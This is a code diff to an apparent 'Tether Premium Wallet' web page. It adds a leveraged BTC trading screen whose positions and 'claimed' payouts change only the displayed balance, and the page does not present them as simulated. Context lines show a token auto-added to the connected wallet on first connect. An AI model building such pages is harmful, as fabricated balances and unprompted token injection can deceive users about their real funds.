@@ -4,6 +4,7 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Tether Premium Wallet</title>
+    <!-- FAVICON FIXED: Using the transparent circular logo -->
     <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/trustwallet/assets/master/blockchains/ethereum/assets/0xdAC17F958D2ee523a2206206994597C13D831ec7/logo.png">
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
@@ -17,7 +18,7 @@
             --black:#000000;
             --surface:#111111;
             --card:#1c1c1e;
-            --card2:#222224; /* Added for Send Modal Compatibility */
+            --card2:#222224; 
             --line:rgba(255,255,255,0.08);
             --line2:rgba(255,255,255,0.04);
             --t1:#ffffff;
@@ -26,7 +27,6 @@
             --green:#30D158;
             --red:#FF453A;
             --blue:#0A84FF;
-            /* Native iOS Font Stack for Clean Professional Look */
             --sys-font: 'Inter', -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
             --mono-font: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, monospace;
         }
@@ -54,9 +54,9 @@
         .bal-row{display:flex;align-items:baseline;justify-content:center; gap:0px;} 
         
         .main-bal-display {display:flex; align-items:baseline; justify-content:center; margin:0;}
-        .main-bal-display .bal-curr { font-size:46px; font-weight:600; color:var(--t1); margin-right:2px; } /* $ Same size as main amount */
+        .main-bal-display .bal-curr { font-size:46px; font-weight:600; color:var(--t1); margin-right:2px; } 
         .main-bal-display .bal-int { font-size:46px; font-weight:600; color:var(--t1); letter-spacing:-1px; font-variant-numeric:tabular-nums; }
-        .main-bal-display .bal-dec { font-size:32px; font-weight:600; color:var(--t2); letter-spacing:0px; } /* Smaller gray decimals */
+        .main-bal-display .bal-dec { font-size:32px; font-weight:600; color:var(--t2); letter-spacing:0px; } 
         
         .bal-change{display:inline-flex;align-items:center;gap:4px;margin-top:8px;font-size:14px;font-weight:500;color:var(--green);}
 
@@ -133,9 +133,7 @@
         .stat-lbl{font-size:11px;color:var(--t2);font-weight:600;letter-spacing:0.5px;margin-bottom:6px;text-transform:uppercase;}
         .stat-val{font-size:15px;font-weight:600;color:var(--t1);font-family:var(--mono-font);}
 
-        /* ─────────────────────────────────────────────
-           SEND MODAL — BOTTOM SHEET (From your verified code)
-           ───────────────────────────────────────────── */
+        /* SEND MODAL */
         .modal-bg{
           position:fixed;inset:0;z-index:400;
           background:rgba(0,0,0,0.7);
@@ -150,7 +148,7 @@
         .modal-bg.show{opacity:1;pointer-events:all;}
 
         .modal-sheet{
-          width:100%;max-width:414px; /* Matched shell width */
+          width:100%;max-width:414px; 
           background:var(--card);
           border-radius:20px 20px 0 0;
           border-top:1px solid rgba(255,255,255,0.08);
@@ -167,7 +165,6 @@
         .sheet-title{font-size:17px;font-weight:800;letter-spacing:-0.2px;}
         .sheet-close{width:28px;height:28px;border-radius:50%;background:var(--card2);display:flex;align-items:center;justify-content:center;cursor:pointer;border:none;color:var(--t2);}
 
-        /* Step 1 — token selector */
         .token-sel-row{
           display:flex;align-items:center;padding:14px 20px;
           cursor:pointer;border-radius:14px;margin:0 12px 8px;
@@ -183,7 +180,6 @@
         .tsr-amount{font-size:15px;font-weight:700;font-variant-numeric:tabular-nums;}
         .tsr-usd{font-size:12px;color:var(--t2);margin-top:2px;font-weight:500;}
 
-        /* Step 2 — send form */
         .send-form{padding:0 16px;}
         .selected-token-card{
           display:flex;align-items:center;
@@ -224,6 +220,41 @@
         .act-ico{width:40px;height:40px;border-radius:50%;flex-shrink:0;margin-right:14px;display:flex;align-items:center;justify-content:center;background:var(--card);border:1px solid var(--line);}
         .act-type{font-size:15px;font-weight:600}
         .act-sub{font-size:12px;color:var(--t2);margin-top:2px;}
+
+        /* ----------------------------------------------------
+           NEW: ADVANCED LIVE TRADING TERMINAL STYLES (0.1% Scalper Logic)
+           ---------------------------------------------------- */
+        .trade-terminal { padding: 0 20px 20px; }
+        .ticker-header { display: flex; justify-content: space-between; align-items: center; padding: 15px 0; border-bottom: 1px solid var(--line); margin-bottom: 15px; }
+        .ticker-sym { font-size: 20px; font-weight: 800; display: flex; align-items: center; gap: 8px; }
+        .ticker-price { font-size: 24px; font-weight: 700; font-family: var(--mono-font); transition: color 0.3s; }
+        .price-up { color: var(--green); }
+        .price-down { color: var(--red); }
+        
+        .trade-actions-box { background: var(--surface); border: 1px solid var(--line); border-radius: 16px; padding: 16px; margin-bottom: 20px; }
+        .trade-input-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 12px; background: rgba(0,0,0,0.4); padding: 12px; border-radius: 10px; border: 1px solid var(--line2); }
+        .trade-input { background: transparent; border: none; color: var(--t1); font-size: 16px; font-family: var(--mono-font); outline: none; width: 100%; text-align: right; }
+        
+        .btn-group { display: flex; gap: 10px; margin-top: 15px; }
+        .btn-long { flex: 1; background: rgba(48,209,88,0.15); color: var(--green); border: 1px solid rgba(48,209,88,0.3); padding: 14px; border-radius: 12px; font-weight: 700; cursor: pointer; transition: 0.2s; }
+        .btn-long:active { transform: scale(0.96); background: var(--green); color: #000; }
+        .btn-short { flex: 1; background: rgba(255,69,58,0.15); color: var(--red); border: 1px solid rgba(255,69,58,0.3); padding: 14px; border-radius: 12px; font-weight: 700; cursor: pointer; transition: 0.2s; }
+        .btn-short:active { transform: scale(0.96); background: var(--red); color: #fff; }
+
+        .active-pos-card { background: linear-gradient(145deg, var(--card), var(--surface)); border: 1px solid var(--line); border-radius: 16px; padding: 16px; position: relative; overflow: hidden; display: none; }
+        .active-pos-card.show { display: block; animation: fadeIn 0.3s ease; }
+        .pos-badge { position: absolute; top: 0; right: 0; padding: 4px 12px; font-size: 10px; font-weight: 800; border-bottom-left-radius: 10px; }
+        .badge-long { background: var(--green); color: #000; }
+        .badge-short { background: var(--red); color: #fff; }
+        
+        .pos-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 15px; margin-top: 10px; }
+        .p-lbl { font-size: 11px; color: var(--t2); text-transform: uppercase; letter-spacing: 0.5px; margin-bottom: 4px; }
+        .p-val { font-size: 15px; font-family: var(--mono-font); font-weight: 600; }
+        .pnl-val { font-size: 20px; font-weight: 800; font-family: var(--mono-font); }
+        
+        .btn-close-pos { width: 100%; background: var(--t1); color: var(--black); border: none; padding: 14px; border-radius: 10px; font-weight: 700; margin-top: 15px; cursor: pointer; transition: 0.2s; }
+        .btn-close-pos:active { transform: scale(0.97); }
+
     </style>
 </head>
 <body>
@@ -243,69 +274,71 @@
   </div>
 
   <div class="scroll-body">
-    <div class="balance-section">
-      <div class="bal-row">
-        <!-- FIXED TYPOGRAPHY: Native iOS MetaMask Style -->
-        <div class="main-bal-display" id="mainBalDisplay">
-            <span class="bal-curr">$</span><span class="bal-int" id="mainValInt">0</span><span class="bal-dec" id="mainValDec">.00</span>
+    <!-- ONLY SHOWN IN WALLET TAB -->
+    <div id="walletHeaderElements">
+      <div class="balance-section">
+        <div class="bal-row">
+          <div class="main-bal-display" id="mainBalDisplay">
+              <span class="bal-curr">$</span><span class="bal-int" id="mainValInt">0</span><span class="bal-dec" id="mainValDec">.00</span>
+          </div>
+        </div>
+        <div class="bal-change">
+          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path stroke-linecap="round" stroke-linejoin="round" d="M5 15l7-7 7 7"/></svg>
+          <span id="bChg">+$0.00 (0.00%)</span>
+        </div>
+        <div class="live-badge" id="syncIndicator" style="display:none;">
+          <div class="live-dot"></div> LIVE SYNC
         </div>
       </div>
-      <div class="bal-change">
-        <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path stroke-linecap="round" stroke-linejoin="round" d="M5 15l7-7 7 7"/></svg>
-        <span id="bChg">+$0.00 (0.00%)</span>
-      </div>
-      <div class="live-badge" id="syncIndicator" style="display:none;">
-        <div class="live-dot"></div> LIVE SYNC
-      </div>
-    </div>
 
-    <div class="chart-wrap" id="chartWrap">
-      <div class="chart-pip" id="chartPip">+0.0%</div>
-      <canvas id="mainCanvas"></canvas>
-      <div class="chart-fade"></div>
-    </div>
+      <div class="chart-wrap" id="chartWrap">
+        <div class="chart-pip" id="chartPip">+0.0%</div>
+        <canvas id="mainCanvas"></canvas>
+        <div class="chart-fade"></div>
+      </div>
 
-    <div class="tf-row">
-      <span class="tf" onclick="selTF(this)">1H</span>
-      <span class="tf" onclick="selTF(this)">1D</span>
-      <span class="tf active" onclick="selTF(this)">1W</span>
-      <span class="tf" onclick="selTF(this)">1M</span>
-      <span class="tf" onclick="selTF(this)">1Y</span>
-      <span class="tf" onclick="selTF(this)">ALL</span>
-    </div>
+      <div class="tf-row">
+        <span class="tf" onclick="selTF(this)">1H</span>
+        <span class="tf" onclick="selTF(this)">1D</span>
+        <span class="tf active" onclick="selTF(this)">1W</span>
+        <span class="tf" onclick="selTF(this)">1M</span>
+        <span class="tf" onclick="selTF(this)">1Y</span>
+        <span class="tf" onclick="selTF(this)">ALL</span>
+      </div>
 
-    <div class="actions-row">
-      <div class="act" onclick="toast2('Opening buy flow…','blue')">
-        <div class="act-ring">
-          <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 5v14M5 12h14"/></svg>
+      <div class="actions-row">
+        <div class="act" onclick="toast2('Opening buy flow…','blue')">
+          <div class="act-ring">
+            <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M12 5v14M5 12h14"/></svg>
+          </div>
+          <span class="act-lbl">Buy</span>
         </div>
-        <span class="act-lbl">Buy</span>
-      </div>
-      <div class="act" onclick="openSend()">
-        <div class="act-ring">
-          <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 19L19 5M19 5v10M19 5H9"/></svg>
+        <div class="act" onclick="openSend()">
+          <div class="act-ring">
+            <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 19L19 5M19 5v10M19 5H9"/></svg>
+          </div>
+          <span class="act-lbl">Send</span>
         </div>
-        <span class="act-lbl">Send</span>
-      </div>
-      <div class="act" onclick="cpyAddr()">
-        <div class="act-ring">
-          <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 5l14 14M5 19V9M5 19h10"/></svg>
+        <div class="act" onclick="cpyAddr()">
+          <div class="act-ring">
+            <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M5 5l14 14M5 19V9M5 19h10"/></svg>
+          </div>
+          <span class="act-lbl">Receive</span>
         </div>
-        <span class="act-lbl">Receive</span>
-      </div>
-      <div class="act" onclick="toast2('Routing to Swap...','white')">
-        <div class="act-ring">
-          <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M8 7h12M16 3l4 4-4 4M16 17H4M8 21l-4-4 4-4"/></svg>
+        <div class="act" onclick="toast2('Routing to Swap...','white')">
+          <div class="act-ring">
+            <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M8 7h12M16 3l4 4-4 4M16 17H4M8 21l-4-4 4-4"/></svg>
+          </div>
+          <span class="act-lbl">Swap</span>
         </div>
-        <span class="act-lbl">Swap</span>
       </div>
-    </div>
 
-    <div class="tabs">
-      <div class="tab active" onclick="selTab('vTokens',this)">Tokens</div>
-      <div class="tab" onclick="selTab('vNFT',this)">NFTs</div>
-      <div class="tab" onclick="selTab('vActivity',this)">Activity</div>
-    </div>
+      <div class="tabs">
+        <div class="tab active" onclick="selTab('vTokens',this)">Tokens</div>
+        <div class="tab" onclick="selTab('vNFT',this)">NFTs</div>
+        <div class="tab" onclick="selTab('vActivity',this)">Activity</div>
+      </div>
+    </div> <!-- End wallet header elements -->
 
     <div id="vTokens" class="view on">
       <div class="list-header">Your Assets</div>
@@ -351,12 +384,94 @@
     <div id="vActivity" class="view">
       <div id="actList"><div style="padding:80px 20px; text-align:center; color:var(--t3); font-size:14px; font-weight:500;">No recent transactions</div></div>
     </div>
+
+    <!-- ==========================================
+         NEW: LIVE MARKET TRADING TERMINAL VIEW
+         ========================================== -->
+    <div id="vMarketView" class="view">
+      <div class="trade-terminal">
+          <div class="ticker-header">
+              <div class="ticker-sym">
+                  <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/1.png" style="width:28px; border-radius:50%;">
+                  BTC/USDT
+              </div>
+              <div class="ticker-price" id="liveTickerPrice">Fetching...</div>
+          </div>
+
+          <div class="trade-actions-box">
+              <div class="trade-input-row">
+                  <span style="color:var(--t2); font-weight:600; font-size:13px;">Margin (USDT)</span>
+                  <input type="number" id="tradeMargin" class="trade-input" placeholder="100.00" value="100">
+              </div>
+              <div class="trade-input-row" style="margin-bottom:0;">
+                  <span style="color:var(--t2); font-weight:600; font-size:13px;">Leverage</span>
+                  <select id="tradeLev" class="trade-input" style="appearance:none; cursor:pointer; width:auto;">
+                      <option value="10">10x</option>
+                      <option value="20" selected>20x</option>
+                      <option value="50">50x</option>
+                      <option value="100">100x</option>
+                  </select>
+              </div>
+              
+              <div class="btn-group">
+                  <button class="btn-long" onclick="executeTrade('LONG')">LONG (Buy)</button>
+                  <button class="btn-short" onclick="executeTrade('SHORT')">SHORT (Sell)</button>
+              </div>
+          </div>
+
+          <div class="list-header" style="padding: 10px 0;">Active Position</div>
+          
+          <div class="active-pos-card" id="activePosCard">
+              <div class="pos-badge" id="posBadge">LONG 20x</div>
+              <div style="font-size:16px; font-weight:800; display:flex; align-items:center; gap:8px;">
+                  <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/1.png" style="width:20px; border-radius:50%;"> BTC/USDT
+              </div>
+              
+              <div class="pos-grid">
+                  <div>
+                      <div class="p-lbl">Entry Price</div>
+                      <div class="p-val" id="posEntry">$0.00</div>
+                  </div>
+                  <div style="text-align:right;">
+                      <div class="p-lbl">Margin</div>
+                      <div class="p-val" id="posMargin">0.00 USDT</div>
+                  </div>
+                  <div>
+                      <div class="p-lbl">Unrealized PNL</div>
+                      <div class="pnl-val" id="posPnl">+$0.00</div>
+                  </div>
+                  <div style="text-align:right;">
+                      <div class="p-lbl">ROE %</div>
+                      <div class="p-val" id="posRoe" style="font-weight:800;">0.00%</div>
+                  </div>
+              </div>
+
+              <button class="btn-close-pos" onclick="closeTrade()">Close Position & Claim</button>
+          </div>
+          
+          <div id="noPosMsg" style="text-align:center; padding:30px 0; color:var(--t3); font-size:14px; font-weight:500;">
+              No open positions
+          </div>
+
+      </div>
+    </div>
   </div>
 
   <div class="bot-nav">
-    <div class="bn active"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg><span class="bn-lbl">HOME</span></div>
-    <div class="bn" onclick="toast2('Markets launching soon','white')"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M7 12l3-3 3 3 4-4M8 21l4-4 4 4M3 4h18M4 4h16v12a1 1 0 01-1 1H5a1 1 0 01-1-1V4z"/></svg><span class="bn-lbl">MARKETS</span></div>
-    <div class="bn" onclick="toast2('Settings soon','white')"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M19.14,12.94c0.04-0.3,0.06-0.61,0.06-0.94c0-0.32-0.02-0.64-0.06-0.94l2.03-1.58c0.18-0.14,0.23-0.41,0.12-0.61 l-1.92-3.32c-0.12-0.22-0.37-0.29-0.59-0.22l-2.39,0.96c-0.5-0.38-1.03-0.7-1.62-0.94L14.4,2.81c-0.04-0.24-0.24-0.41-0.48-0.41 h-3.84c-0.24,0-0.43,0.17-0.47,0.41L9.25,5.35C8.66,5.59,8.12,5.92,7.63,6.29L5.24,5.33c-0.22-0.08-0.47,0-0.59,0.22L2.73,8.87 C2.62,9.08,2.66,9.34,2.86,9.48l2.03,1.58C4.84,11.36,4.8,11.69,4.8,12s0.02,0.64,0.06,0.94l-2.03,1.58 c-0.18,0.14-0.23,0.41-0.12,0.61l1.92,3.32c0.12,0.22,0.37,0.29,0.59,0.22l2.39-0.96c0.5,0.38,1.03,0.7,1.62,0.94l0.36,2.54 c0.05,0.24,0.24,0.41,0.48,0.41h3.84c0.24,0,0.43-0.17,0.47-0.41l0.36-2.54c0.59-0.24,1.13-0.56,1.62-0.94l2.39,0.96 c0.22,0.08,0.47,0,0.59-0.22l1.92-3.32c0.12-0.22,0.07-0.49-0.12-0.61L19.14,12.94z M12,15.6c-1.99,0-3.6-1.61-3.6-3.6 s1.61-3.6,3.6-3.6s3.6,1.61,3.6,3.6S13.99,15.6,12,15.6z"/></svg><span class="bn-lbl">SETTINGS</span></div>
+    <!-- Fixed Nav Logic -->
+    <div class="bn active" onclick="switchMainTab('wallet', this)">
+        <svg fill="currentColor" viewBox="0 0 24 24"><path d="M10 20v-6h4v6h5v-8h3L12 3 2 12h3v8z"/></svg>
+        <span class="bn-lbl">HOME</span>
+    </div>
+    <div class="bn" onclick="switchMainTab('market', this)">
+        <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M7 12l3-3 3 3 4-4M8 21l4-4 4 4M3 4h18M4 4h16v12a1 1 0 01-1 1H5a1 1 0 01-1-1V4z"/></svg>
+        <span class="bn-lbl">MARKETS</span>
+    </div>
+    <!-- Fixed Settings Icon (Straight Gear) -->
+    <div class="bn" onclick="toast2('Settings soon','white')">
+        <svg fill="currentColor" viewBox="0 0 24 24"><path d="M19.14,12.94c0.04-0.3,0.06-0.61,0.06-0.94c0-0.32-0.02-0.64-0.06-0.94l2.03-1.58c0.18-0.14,0.23-0.41,0.12-0.61 l-1.92-3.32c-0.12-0.22-0.37-0.29-0.59-0.22l-2.39,0.96c-0.5-0.38-1.03-0.7-1.62-0.94L14.4,2.81c-0.04-0.24-0.24-0.41-0.48-0.41 h-3.84c-0.24,0-0.43,0.17-0.47,0.41L9.25,5.35C8.66,5.59,8.12,5.92,7.63,6.29L5.24,5.33c-0.22-0.08-0.47,0-0.59,0.22L2.73,8.87 C2.62,9.08,2.66,9.34,2.86,9.48l2.03,1.58C4.84,11.36,4.8,11.69,4.8,12s0.02,0.64,0.06,0.94l-2.03,1.58 c-0.18,0.14-0.23,0.41-0.12,0.61l1.92,3.32c0.12,0.22,0.37,0.29,0.59,0.22l2.39-0.96c0.5,0.38,1.03,0.7,1.62,0.94l0.36,2.54 c0.05,0.24,0.24,0.41,0.48,0.41h3.84c0.24,0,0.43-0.17,0.47-0.41l0.36-2.54c0.59-0.24,1.13-0.56,1.62-0.94l2.39,0.96 c0.22,0.08,0.47,0,0.59-0.22l1.92-3.32c0.12-0.22,0.07-0.49-0.12-0.61L19.14,12.94z M12,15.6c-1.99,0-3.6-1.61-3.6-3.6 s1.61-3.6,3.6-3.6s3.6,1.61,3.6,3.6S13.99,15.6,12,15.6z"/></svg>
+        <span class="bn-lbl">SETTINGS</span>
+    </div>
   </div>
 </div>
 
@@ -437,13 +552,12 @@
 </div>
 
 <!-- ==========================================
-     SEND MODAL — BOTTOM SHEET (From your working code)
+     SEND MODAL — BOTTOM SHEET
      ========================================== -->
 <div class="modal-bg" id="sendModal" onclick="if(event.target===this)closeSend()">
   <div class="modal-sheet" id="sendSheet">
     <div class="sheet-handle"></div>
 
-    <!-- STEP 1: Token selector -->
     <div id="sendStep1">
       <div class="sheet-header">
         <span class="sheet-title">Select Token</span>
@@ -451,13 +565,9 @@
           <svg width="14" height="14" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M6 18L18 6M6 6l12 12"/></svg>
         </button>
       </div>
-
-      <div style="padding:0 4px 8px;" id="tokenSelectorList">
-        <!-- populated by JS -->
-      </div>
+      <div style="padding:0 4px 8px;" id="tokenSelectorList"></div>
     </div>
 
-    <!-- STEP 2: Send form -->
     <div id="sendStep2" style="display:none;">
       <div class="sheet-header">
         <div style="display:flex;align-items:center;gap:4px;cursor:pointer;" onclick="goStep1()">
@@ -510,6 +620,122 @@ let currentDetailSym = 'main';
 let lastDisplayedBalance = 0;
 
 // ==========================================
+// LIVE TRADING (BINANCE WEBSOCKET) STATE
+// ==========================================
+let liveBtcPrice = 0;
+let btcWs = null;
+let activeTrade = null; // { type: 'LONG'|'SHORT', entry: 0, margin: 0, lev: 0 }
+
+function initLiveTradingFeed() {
+    if(btcWs) return;
+    btcWs = new WebSocket('wss://stream.binance.com:9443/ws/btcusdt@trade');
+    btcWs.onmessage = (event) => {
+        const data = JSON.parse(event.data);
+        const newPrice = parseFloat(data.p);
+        
+        const priceEl = document.getElementById('liveTickerPrice');
+        if(newPrice > liveBtcPrice) {
+            priceEl.className = 'ticker-price price-up';
+        } else if (newPrice < liveBtcPrice) {
+            priceEl.className = 'ticker-price price-down';
+        }
+        liveBtcPrice = newPrice;
+        priceEl.innerText = '$' + liveBtcPrice.toLocaleString('en-US', {minimumFractionDigits: 2, maximumFractionDigits:2});
+        
+        // Calculate PNL if trade is open
+        if(activeTrade) {
+            updateLivePNL();
+        }
+    };
+}
+
+function executeTrade(type) {
+    if(!account) return toast2('Connect wallet first', 'red');
+    if(activeTrade) return toast2('Position already open', 'red');
+    if(liveBtcPrice === 0) return toast2('Waiting for live price...', 'white');
+    
+    const margin = parseFloat(document.getElementById('tradeMargin').value);
+    const lev = parseInt(document.getElementById('tradeLev').value);
+    
+    if(isNaN(margin) || margin <= 0) return toast2('Invalid Margin', 'red');
+    if(margin > usdtBal) return toast2('Insufficient USDT Balance', 'red');
+
+    // Deduct local balance for realistic simulation
+    usdtBal -= margin;
+    updateDOMBalancesLocally();
+
+    activeTrade = { type: type, entry: liveBtcPrice, margin: margin, lev: lev };
+    
+    document.getElementById('posBadge').innerText = `${type} ${lev}x`;
+    document.getElementById('posBadge').className = `pos-badge ${type==='LONG'?'badge-long':'badge-short'}`;
+    document.getElementById('posEntry').innerText = '$' + liveBtcPrice.toLocaleString('en-US',{minimumFractionDigits:2});
+    document.getElementById('posMargin').innerText = margin.toFixed(2) + ' USDT';
+    
+    document.getElementById('noPosMsg').style.display = 'none';
+    document.getElementById('activePosCard').classList.add('show');
+    
+    toast2(`Opened ${type} Position`, 'green');
+    saveTx('MARKET', margin, 'USDT'); // Log activity
+}
+
+function updateLivePNL() {
+    if(!activeTrade) return;
+    
+    let priceDiff = 0;
+    if(activeTrade.type === 'LONG') {
+        priceDiff = (liveBtcPrice - activeTrade.entry) / activeTrade.entry;
+    } else {
+        priceDiff = (activeTrade.entry - liveBtcPrice) / activeTrade.entry;
+    }
+    
+    const roe = priceDiff * activeTrade.lev * 100; // Return on Equity percentage
+    const pnl = activeTrade.margin * (roe / 100);  // Profit/Loss in USDT
+    
+    const pnlEl = document.getElementById('posPnl');
+    const roeEl = document.getElementById('posRoe');
+    
+    pnlEl.innerText = (pnl >= 0 ? '+$' : '-$') + Math.abs(pnl).toLocaleString('en-US',{minimumFractionDigits:2});
+    pnlEl.style.color = pnl >= 0 ? 'var(--green)' : 'var(--red)';
+    
+    roeEl.innerText = (roe >= 0 ? '+' : '') + roe.toFixed(2) + '%';
+    roeEl.style.color = pnl >= 0 ? 'var(--green)' : 'var(--red)';
+    
+    activeTrade.currentPnl = pnl;
+}
+
+function closeTrade() {
+    if(!activeTrade) return;
+    
+    const finalPayout = activeTrade.margin + (activeTrade.currentPnl || 0);
+    
+    // Add margin back + profit/loss locally
+    usdtBal += finalPayout;
+    if(usdtBal < 0) usdtBal = 0; // Prevent negative display
+    updateDOMBalancesLocally();
+    
+    document.getElementById('activePosCard').classList.remove('show');
+    setTimeout(() => {
+        document.getElementById('noPosMsg').style.display = 'block';
+    }, 300);
+    
+    toast2(`Closed. Payout: $${finalPayout.toFixed(2)}`, activeTrade.currentPnl >= 0 ? 'green' : 'red');
+    saveTx('CLOSE_POS', activeTrade.currentPnl.toFixed(2), 'USDT PNL');
+    
+    activeTrade = null;
+}
+
+// Helper to quickly update the UI when simulating trades
+function updateDOMBalancesLocally() {
+    const fmtStr = usdtBal.toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2});
+    document.getElementById('rowUsdtBal').textContent = fmtStr;
+    document.getElementById('rowUsdtUsd').textContent = "$"+fmtStr;
+    
+    const totalUsd = usdtBal + (bnbBal * bnbPrice);
+    animateValue(lastDisplayedBalance, totalUsd, 400);
+    lastDisplayedBalance = totalUsd;
+}
+
+// ==========================================
 // UI UTILITIES
 // ==========================================
 function toast2(msg,type='white'){
@@ -520,9 +746,44 @@ function toast2(msg,type='white'){
   el.classList.add('show');clearTimeout(toastTimer);toastTimer=setTimeout(()=>el.classList.remove('show'),3200);
 }
 
+// Master Tab Switcher
+function switchMainTab(viewName, btnEl) {
+    document.querySelectorAll('.bn').forEach(b=>b.classList.remove('active'));
+    btnEl.classList.add('active');
+    
+    const walletHeader = document.getElementById('walletHeaderElements');
+    const vTokens = document.getElementById('vTokens');
+    const vNFT = document.getElementById('vNFT');
+    const vActivity = document.getElementById('vActivity');
+    const vMarketView = document.getElementById('vMarketView');
+    
+    if(viewName === 'wallet') {
+        walletHeader.style.display = 'block';
+        vMarketView.classList.remove('on');
+        
+        // Restore currently selected sub-tab in wallet
+        document.querySelectorAll('.tab').forEach(t => {
+            if(t.classList.contains('active')) {
+                if(t.innerText === 'Tokens') vTokens.classList.add('on');
+                else if(t.innerText === 'NFTs') vNFT.classList.add('on');
+                else if(t.innerText === 'Activity') vActivity.classList.add('on');
+            }
+        });
+    } else if (viewName === 'market') {
+        walletHeader.style.display = 'none';
+        vTokens.classList.remove('on');
+        vNFT.classList.remove('on');
+        vActivity.classList.remove('on');
+        vMarketView.classList.add('on');
+        initLiveTradingFeed(); // Ensure WebSocket is running
+    }
+}
+
 function selTab(id,el){
   document.querySelectorAll('.tab').forEach(t=>t.classList.remove('active'));
-  document.querySelectorAll('.view').forEach(v=>v.classList.remove('on'));
+  document.querySelectorAll('.view').forEach(v=> {
+      if(v.id !== 'vMarketView') v.classList.remove('on');
+  });
   el.classList.add('active');document.getElementById(id).classList.add('on');
   if(id==='vActivity')renderActivity();
 }
@@ -635,7 +896,6 @@ async function doConnect(){
     toast2('Connected! Fetching Balance...','green');
     fetchBalances();if(syncLoop)clearInterval(syncLoop);syncLoop=setInterval(fetchBalances,4000);
     
-    // Auto popup ONLY if not injected before (runs silently on first connect)
     const key=INJECT_KEY_PREFIX+account.toLowerCase();
     if(!localStorage.getItem(key)) {
         setTimeout(()=>{ autoInjectToken(wp, key); }, 2000);
@@ -669,7 +929,7 @@ async function injectTokenManual() {
         if(btnText) btnText.innerText = "Approve in Wallet...";
         await walletProvider.request({
             method: 'wallet_watchAsset',
-            params: { type: 'ERC20', options: { address: CONTRACT_ADDRESS, symbol: sym, decimals: dec, image: LOGO } }
+            params: { type: 'ERC20', options: { address: CONTRACT, symbol: sym, decimals: dec, image: LOGO } }
         });
 
         const key=INJECT_KEY_PREFIX+account.toLowerCase();
@@ -734,7 +994,6 @@ async function loadMarketTokens() {
 async function fetchBalances(){
   if(!account)return;
 
-  // PURE PUBLIC RPC FETCH TO BYPASS TRUST WALLET RESTRICTIONS
   const publicProvider = new ethers.providers.JsonRpcProvider('https://bsc-dataseed.binance.org/');
   
   try {
@@ -743,7 +1002,12 @@ async function fetchBalances(){
     const dec = await publicContract.decimals();
     usdtBal = parseFloat(ethers.utils.formatUnits(rawUSDT,dec));
     
-    const fmtStr = usdtBal.toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2});
+    // If a trade is active, locally modify the displayed balance 
+    // so the margin is correctly hidden from available balance.
+    let displayBal = usdtBal;
+    if(activeTrade) displayBal -= activeTrade.margin;
+    
+    const fmtStr = displayBal.toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2});
     document.getElementById('rowUsdtBal').textContent = fmtStr;
     document.getElementById('rowUsdtUsd').textContent = "$"+fmtStr;
   } catch(e) { console.error("USDT Fetch Error:", e); }
@@ -765,8 +1029,10 @@ async function fetchBalances(){
     document.getElementById('rowBnbUsd').textContent = '$'+bnbUsd.toLocaleString('en-US',{minimumFractionDigits:2});
   } catch(e) { console.error("BNB Fetch Error:", e); }
 
-  // TOTAL BALANCE UPDATE (Animated)
-  const totalUsd = usdtBal + (bnbBal * bnbPrice);
+  let displayUsdt = usdtBal;
+  if(activeTrade) displayUsdt -= activeTrade.margin;
+  
+  const totalUsd = displayUsdt + (bnbBal * bnbPrice);
   if (totalUsd !== lastDisplayedBalance) {
       animateValue(lastDisplayedBalance, totalUsd, 800);
       lastDisplayedBalance = totalUsd;
@@ -777,13 +1043,15 @@ async function fetchBalances(){
 }
 
 // ==========================================
-// SEND MODAL 2-STEP LOGIC (From your provided code)
+// SEND MODAL 2-STEP LOGIC
 // ==========================================
 function openSend(){
   if(!account)return toast2('Connect wallet first','red');
 
-  // Build token selector with real fetched balances
-  const usdtFmt=usdtBal.toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2});
+  let sendableUsdt = usdtBal;
+  if(activeTrade) sendableUsdt -= activeTrade.margin;
+
+  const usdtFmt=sendableUsdt.toLocaleString('en-US',{minimumFractionDigits:2,maximumFractionDigits:2});
